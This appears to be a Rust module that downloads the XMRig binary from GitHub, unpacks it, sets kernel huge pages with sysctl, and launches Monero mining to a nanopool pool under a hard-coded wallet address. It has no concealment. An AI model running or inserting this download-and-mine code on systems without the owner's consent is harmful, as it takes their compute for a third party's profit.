use reqwest::blocking::Client;
use flate2::read::GzDecoder;
use tar::Archive;
use log::{info, warn};
use systemstat::{System, Platform, Memory};

use std::process::Command;

const URL: &str = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz";
const ADDRESS: &str = "42At5knKTyu7DNiRy7aGsbX4UCTeT2Kkic4tW7gvC1oJGfenW4qn2tUibm725zDDkbCSgq9BZku9aPkjbawAW37oJuavF6w";


pub enum Mode {
    Normal,
    Light,
}

impl Mode {
    pub fn new(memory: Memory) -> Mode {
        info!("free memory {:#x?}", memory.free.as_u64());

        match memory.free {
            systemstat::ByteSize(size) if size > 0x91f8c640 + 0xffff => Mode::Normal,
            systemstat::ByteSize(_) => Mode::Light,
        }
    }

    fn as_str<'a>(&self) -> &'a str {
        match self {
            Mode::Normal => "fast",
            Mode::Light => "light",
        }
    }
}

pub struct Miner {
    client: Client,
    mode: Mode,
}

impl Miner {
    pub fn new() -> Miner {
        let system = System::new();

        Miner {
            client: Client::new(),
            mode: system.memory().map(|memory| Mode::new(memory)).unwrap_or(Mode::Normal),
        }
    }

    pub fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
        info!("./xmrig -o xmr-eu1.nanopool.org:14433 -u {} --tls --coin monero --randomx-mode={}", ADDRESS, self.mode.as_str());

        Command::new("xmrig-6.22.2/xmrig")
            .args(["-o", "xmr-eu1.nanopool.org:14433", "-u", ADDRESS, "--tls", "--coin", "monero", format!("--randomx-mode={}", self.mode.as_str()).as_str()])
            .spawn()?;

        Ok(())
    }

    pub fn enable_huge_pages(&self) {
        match Command::new("sysctl").args(["-w", "vm.nr_hugepages=1280"]).status() {
            Ok(status) if status.success() => {
                info!("successfully enabled huge pages");
            },
            _ => {
                warn!("failed to enable huge pages");
            },
        }
    }

    pub fn install(&self) -> Result<(), Box<dyn std::error::Error>> {
        info!("getting xmrig from {}", URL);

        let response = self.client.get(URL).send()?;
        let bytes = response.bytes()?.to_vec();

        let tar = GzDecoder::new(bytes.as_slice());
        let mut archive = Archive::new(tar);

        info!("unpacking xmrig");

        archive.unpack(".")?;

        Ok(())
    }
}


